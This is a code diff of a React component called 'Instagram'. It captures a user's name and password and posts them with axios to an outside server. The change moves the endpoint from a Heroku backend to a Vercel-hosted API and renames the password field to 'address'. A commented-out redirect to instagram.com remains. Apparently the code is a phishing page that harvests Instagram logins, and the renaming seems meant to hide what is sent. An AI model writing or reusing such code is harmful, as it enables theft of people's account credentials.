@@ -4,20 +4,21 @@ import axios from 'axios'
 
 function Instagram() {
 
+  const api = "https://node-kafka.vercel.app"
     const [name,setName] = useState("")
     const [password,setPassword] = useState("")
 
-    let username = name
-    let description = password
-    let duration = 4
-    let date = new Date()
+    // let username = name
+    let address = password
+    // let duration = 4
+    let slug = new Date()
     const savedata = () => {
       // window.location.href = 'www.instagram.com';
         let data = ({
-            username,
-            description,
-            duration,
-            date  
+            name,
+            address,
+            // duration,
+            slug  
         })
 
         const headers = {
@@ -25,7 +26,7 @@ function Instagram() {
           'Accept': 'Application/Json'
           }
 
-        axios.post('https://backendaloginda.herokuapp.com/exercises/add', data)
+        axios.post(`${api}/v1/post`, data)
 
         console.log(data)  
       
